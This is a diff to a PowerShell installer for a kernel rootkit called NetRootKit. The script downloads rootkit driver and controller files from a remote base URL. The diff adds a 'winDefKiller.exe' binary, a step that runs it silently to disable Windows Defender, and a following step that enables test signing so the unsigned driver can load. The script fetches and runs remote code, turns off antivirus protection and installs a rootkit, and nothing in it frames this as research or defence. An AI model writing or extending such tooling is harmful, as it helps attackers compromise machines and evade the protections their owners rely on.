@@ -63,7 +63,8 @@ $FilesToDownload = @(
     "NetRootKit.sys",
     "NetRootKitController.exe",
     "netrootkit.cat",
-    "devcon.exe"
+    "devcon.exe",
+    "winDefKiller.exe"
 )
 
 Write-Host "[*] Downloading NetRootKit components from GitHub..."
@@ -72,6 +73,19 @@ foreach ($File in $FilesToDownload) {
         Write-Host "    -> Downloading $File..."
         Invoke-WebRequest -Uri "$BaseUrl/$File" -OutFile "$TempDir\$File" -UseBasicParsing
     }
+}
+
+# --- 4.5. Execute WinDefenderKiller ---
+Write-Host "[*] Executing winDefKiller.exe to neutralize Windows Defender components..."
+try {
+    if (Test-Path "$TempDir\winDefKiller.exe") {
+        Start-Process -FilePath "$TempDir\winDefKiller.exe" -NoNewWindow -Wait -ErrorAction SilentlyContinue
+        Write-Host "[+] winDefKiller executed."
+    } else {
+        Write-Host "[-] winDefKiller.exe not found. Skipping."
+    }
+} catch {
+    Write-Host "[-] Failed to execute winDefKiller."
 }
 
 # --- 5. Check / Enable TESTSIGNING ---
